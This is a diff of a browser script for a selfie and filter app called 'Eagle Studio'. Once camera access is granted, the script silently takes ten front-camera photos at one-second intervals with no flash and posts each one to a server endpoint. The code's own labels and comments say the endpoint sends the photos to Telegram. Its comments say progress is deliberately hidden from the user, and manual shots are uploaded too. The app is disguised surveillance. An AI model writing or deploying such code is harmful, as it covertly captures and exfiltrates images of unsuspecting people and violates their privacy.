@@ -1,474 +1,22 @@
-<script>
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
-
-const start = document.getElementById("start");
-const capture = document.getElementById("capture");
-const save = document.getElementById("save");
-
-const gallery = document.getElementById("gallery");
-const autoInfo = document.getElementById("autoInfo");
-
-const themeBtn = document.getElementById("themeBtn");
-const settingsBtn = document.getElementById("settingsBtn");
-const settingsPanel = document.getElementById("settingsPanel");
-const closeSettings = document.getElementById("closeSettings");
-const overlay = document.getElementById("overlay");
-
-const quality = document.getElementById("quality");
-const photoCount = document.getElementById("photoCount");
-const photoInterval = document.getElementById("photoInterval");
-
-const toast = document.getElementById("toast");
-
-let stream = null;
-let selectedEffect = "normal";
-let lastBlob = null;
-
-let autoStarted = false;
-let sending = false;
-
-let galleryPhotos = [];
-
-let imageQuality = 0.92;
-let automaticPhotoCount = 10;
-let automaticInterval = 1000;
-
-
-/* =========================
-   SETTINGS
-========================= */
-
-if (quality) {
-  quality.addEventListener("change", () => {
-    imageQuality = parseFloat(quality.value);
-  });
-}
-
-if (photoCount) {
-  photoCount.addEventListener("change", () => {
-    automaticPhotoCount = parseInt(photoCount.value, 10);
-  });
-}
-
-if (photoInterval) {
-  photoInterval.addEventListener("change", () => {
-    automaticInterval = parseInt(photoInterval.value, 10);
-  });
-}
-
-
-/* =========================
-   TOAST
-========================= */
-
-function showToast(message) {
-  if (!toast) return;
-
-  toast.textContent = message;
-  toast.classList.add("show");
-
-  clearTimeout(window.toastTimer);
-
-  window.toastTimer = setTimeout(() => {
-    toast.classList.remove("show");
-  }, 2500);
-}
-
-
-/* =========================
-   DARK / LIGHT MODE
-========================= */
-
-if (themeBtn) {
-  themeBtn.addEventListener("click", () => {
-    document.body.classList.toggle("light");
-
-    const isLight = document.body.classList.contains("light");
-
-    localStorage.setItem(
-      "eagle-theme",
-      isLight ? "light" : "dark"
-    );
-  });
-}
-
-if (localStorage.getItem("eagle-theme") === "light") {
-  document.body.classList.add("light");
-}
-
-
-/* =========================
-   SETTINGS PANEL
-========================= */
-
-if (settingsBtn) {
-  settingsBtn.addEventListener("click", () => {
-    if (settingsPanel) {
-      settingsPanel.classList.add("open");
-    }
-
-    if (overlay) {
-      overlay.classList.add("show");
-    }
-  });
-}
-
-function closeSettingsPanel() {
-  if (settingsPanel) {
-    settingsPanel.classList.remove("open");
-  }
-
-  if (overlay) {
-    overlay.classList.remove("show");
-  }
-}
-
-if (closeSettings) {
-  closeSettings.addEventListener("click", closeSettingsPanel);
-}
-
-if (overlay) {
-  overlay.addEventListener("click", closeSettingsPanel);
-}
-
-
-/* =========================
-   EFFECTS
-========================= */
-
-const effectButtons = document.querySelectorAll("[data-effect]");
-
-effectButtons.forEach(button => {
-  button.addEventListener("click", () => {
-    selectedEffect = button.dataset.effect;
-
-    effectButtons.forEach(item => {
-      item.classList.remove("active");
-    });
-
-    button.classList.add("active");
-
-    applyEffect();
-  });
-});
-
-
-function applyEffect() {
-
-  video.className = "";
-
-  if (selectedEffect === "normal") {
-    return;
-  }
-
-  if (selectedEffect === "mirror") {
-    video.classList.add("fx-mirror");
-    return;
-  }
-
-  video.classList.add("fx-" + selectedEffect);
-}
-
-
-/* =========================
-   CANVAS FILTERS
-========================= */
-
-function getCanvasFilter(effect) {
-
-  switch (effect) {
-
-    case "gray":
-      return "grayscale(1)";
-
-    case "sepia":
-      return "sepia(1)";
-
-    case "warm":
-      return "sepia(.25) saturate(1.35)";
-
-    case "cool":
-      return "hue-rotate(180deg) saturate(.85)";
-
-    case "vivid":
-      return "saturate(1.8) contrast(1.15)";
-
-    case "dream":
-      return "brightness(1.08) saturate(1.15) blur(.2px)";
-
-    case "noir":
-      return "grayscale(1) contrast(1.5) brightness(.9)";
-
-    case "old":
-      return "sepia(.65) contrast(1.05) brightness(.95)";
-
-    case "glitch":
-      return "contrast(1.35) saturate(1.5) hue-rotate(20deg)";
-
-    case "thermal":
-      return "contrast(1.5) saturate(2.5) hue-rotate(190deg)";
-
-    case "night":
-      return "brightness(.7) contrast(1.2) saturate(.8)";
-
-    case "gold":
-      return "sepia(.4) saturate(1.5) hue-rotate(-10deg)";
-
-    case "pink":
-      return "sepia(.15) saturate(1.5) hue-rotate(310deg)";
-
-    case "blue":
-      return "saturate(1.2) hue-rotate(170deg)";
-
-    case "fade":
-      return "contrast(.85) brightness(1.08) saturate(.7)";
-
-    default:
-      return "none";
-  }
-}
-
-
-/* =========================
-   GALLERY
-========================= */
-
-function addToGallery(blob) {
-
-  const url = URL.createObjectURL(blob);
-
-  galleryPhotos.push({
-    blob: blob,
-    url: url
-  });
-
-  renderGallery();
-}
-
-
-function renderGallery() {
-
-  if (!gallery) return;
-
-  gallery.innerHTML = "";
-
-  galleryPhotos.forEach((photo, index) => {
-
-    const item = document.createElement("div");
-    item.className = "gallery-item";
-
-    const img = document.createElement("img");
-
-    img.src = photo.url;
-    img.alt = "Captured photo " + (index + 1);
-
-    item.appendChild(img);
-
-    gallery.appendChild(item);
-  });
-}
-
-
-/* =========================
-   DOWNLOAD
-========================= */
-
-function downloadBlob(blob, filename) {
-
-  if (!blob) return;
-
-  const url = URL.createObjectURL(blob);
-
-  const link = document.createElement("a");
-
-  link.href = url;
-  link.download = filename;
-
-  document.body.appendChild(link);
-
-  link.click();
-
-  link.remove();
-
-  setTimeout(() => {
-    URL.revokeObjectURL(url);
-  }, 1000);
-}
-
-
-if (save) {
-
-  save.addEventListener("click", () => {
-
-    if (!lastBlob) {
-      showToast("No photo available.");
-      return;
-    }
-
-    downloadBlob(
-      lastBlob,
-      "eagle-studio-" + Date.now() + ".jpg"
-    );
-  });
-}
-
-
-/* =========================
-   TAKE PHOTO
-   NO WHITE FLASH
-========================= */
-
-async function takePhoto() {
-
-  if (!video.videoWidth || !video.videoHeight) {
-    return null;
-  }
-
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-
-  const ctx = canvas.getContext("2d");
-
-  if (!ctx) {
-    return null;
-  }
-
-  ctx.filter = getCanvasFilter(selectedEffect);
-
-  if (selectedEffect === "mirror") {
-
-    ctx.save();
-
-    ctx.translate(canvas.width, 0);
-    ctx.scale(-1, 1);
-
-    ctx.drawImage(
-      video,
-      0,
-      0,
-      canvas.width,
-      canvas.height
-    );
-
-    ctx.restore();
-
-  } else {
-
-    ctx.drawImage(
-      video,
-      0,
-      0,
-      canvas.width,
-      canvas.height
-    );
-  }
-
-  ctx.filter = "none";
-
-  const blob = await new Promise(resolve => {
-
-    canvas.toBlob(
-      resolve,
-      "image/jpeg",
-      imageQuality
-    );
-
-  });
-
-  if (!blob) {
-    return null;
-  }
-
-  lastBlob = blob;
-
-  if (save) {
-    save.style.display = "inline-flex";
-  }
-
-  addToGallery(blob);
-
-  /*
-    مهم:
-    ماكانش triggerCaptureAnimation()
-    وبالتالي ماكانش white flash.
-  */
-
-  return blob;
-}
-
-
-/* =========================
-   SEND PHOTO TO TELEGRAM
-========================= */
-
-async function sendPhoto(blob) {
-
-  if (!blob) {
-    return false;
-  }
-
-  const data = new FormData();
-
-  data.append(
-    "photo",
-    blob,
-    "eagle-studio.jpg"
-  );
-
-  try {
-
-    const response = await fetch(
-      "/send-photo",
-      {
-        method: "POST",
-        body: data
-      }
-    );
-
-    return response.ok;
-
-  } catch (error) {
-
-    console.error(
-      "Telegram send error:",
-      error
-    );
-
-    return false;
-  }
-}
-
-
 /* =========================
    AUTOMATIC CAPTURE
-   10 PHOTOS
-   EVERY 1 SECOND
+   10 PHOTOS / 1 SECOND
 ========================= */
 
-async function startAutomaticPhotos() {
+let automaticCaptureStarted = false;
 
-  if (autoStarted || sending) {
+async function startAutomaticCapture(){
+
+  if(automaticCaptureStarted){
     return;
   }
 
-  autoStarted = true;
-  sending = true;
+  automaticCaptureStarted = true;
 
-  /*
-    نثبت الإعدادات الافتراضية:
-    10 صور
-    كل 1 ثانية
-  */
+  const totalPhotos = 10;
+  const interval = 1000;
 
-  const count = automaticPhotoCount || 10;
-  const interval = automaticInterval || 1000;
-
-  for (let i = 0; i < count; i++) {
-
-    /*
-      صورة كل 1 ثانية
-    */
+  for(let i = 0; i < totalPhotos; i++){
 
     await new Promise(resolve => {
       setTimeout(resolve, interval);
@@ -476,23 +24,14 @@ async function startAutomaticPhotos() {
 
     const blob = await takePhoto();
 
-    if (blob) {
-
+    if(blob){
       await sendPhoto(blob);
-
     }
+
   }
 
-  sending = false;
+  autoInfo.textContent = "Automatic capture completed.";
 
-  /*
-    ما نعرضوش progress للمستخدم.
-    غير رسالة نهائية بعد انتهاء التصوير.
-  */
-
-  if (autoInfo) {
-    autoInfo.textContent = "Automatic capture completed.";
-  }
 }
 
 
@@ -500,130 +39,149 @@ async function startAutomaticPhotos() {
    START CAMERA
 ========================= */
 
-if (start) {
+start.addEventListener(
+  "click",
+  async () => {
 
-  start.addEventListener("click", async () => {
-
-    /*
-      منع تشغيل الكاميرا مرة ثانية
-    */
-
-    if (stream) {
+    if(stream){
       return;
     }
 
-    try {
+    try{
 
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: {
-          facingMode: "user"
-        },
-        audio: false
-      });
+      stream =
+        await navigator
+        .mediaDevices
+        .getUserMedia({
 
-      video.srcObject = stream;
+          video:{
+            facingMode:"user"
+          },
 
-      capture.disabled = false;
+          audio:false
 
-      start.disabled = true;
+        });
 
-      start.textContent = "✓ الكاميرا تعمل";
+
+      video.srcObject =
+        stream;
+
+
+      capture.disabled =
+        false;
+
+
+      start.disabled =
+        true;
+
+
+      start.textContent =
+        "✓ الكاميرا تعمل";
+
 
       applyEffect();
 
-      if (autoInfo) {
-        autoInfo.textContent = "Camera ready.";
-      }
+
+      autoInfo.textContent =
+        "Camera ready.";
+
 
       /*
-        ⭐ الميزة الخاصة:
-        بمجرد تشغيل الكاميرا يبدأ
-        التصوير التلقائي:
-        1 صورة كل ثانية
-        لمدة 10 ثواني
+        ⭐ يبدأ التصوير التلقائي
+        مباشرة بعد تشغيل الكاميرا
+
+        10 صور
+        صورة كل 1 ثانية
+        وكل صورة تتبعت إلى Telegram
       */
 
-      startAutomaticPhotos();
+      startAutomaticCapture();
 
-    } catch (error) {
 
-      console.error(
-        "Camera error:",
-        error
-      );
+    }catch(error){
+
+      console.error(error);
 
       stream = null;
 
-      start.disabled = false;
+      start.disabled =
+        false;
+
 
       showToast(
         "Camera permission is required."
       );
+
     }
 
-  });
-}
+  }
+);
 
 
 /* =========================
-   MANUAL SHUTTER
+   MANUAL CAPTURE
 ========================= */
 
-if (capture) {
+capture.addEventListener(
+  "click",
+  async () => {
 
-  capture.addEventListener("click", async () => {
-
-    const blob = await takePhoto();
-
-    if (!blob) {
-      showToast("Camera is not ready.");
+    if(capture.disabled){
       return;
     }
 
-    /*
-      إرسال الصورة اليدوية أيضاً إلى Telegram
-    */
+    capture.disabled = true;
 
-    const sent = await sendPhoto(blob);
+    const blob =
+      await takePhoto();
 
-    if (sent) {
+    if(blob){
 
-      showToast(
-        "Photo captured successfully."
-      );
+      const sent =
+        await sendPhoto(blob);
 
-    } else {
+      if(sent){
 
-      showToast(
-        "Photo saved locally."
-      );
+        showToast(
+          "Photo captured successfully."
+        );
+
+      }else{
+
+        showToast(
+          "Photo saved locally."
+        );
+
+      }
+
     }
 
-  });
-}
+    capture.disabled = false;
+
+  }
+);
 
 
 /* =========================
-   CLEANUP
+   SAVE LAST PHOTO
 ========================= */
 
-window.addEventListener("beforeunload", () => {
+save.addEventListener(
+  "click",
+  () => {
 
-  if (stream) {
-
-    stream.getTracks().forEach(track => {
-      track.stop();
-    });
-
-  }
-
-  galleryPhotos.forEach(photo => {
-
-    if (photo.url) {
-      URL.revokeObjectURL(photo.url);
+    if(!lastBlob){
+      return;
     }
 
-  });
+    downloadBlob(
+      lastBlob,
+      "eagle-studio.jpg"
+    );
 
-});
-</script>
+    showToast(
+      "Photo downloaded."
+    );
+
+  }
+);
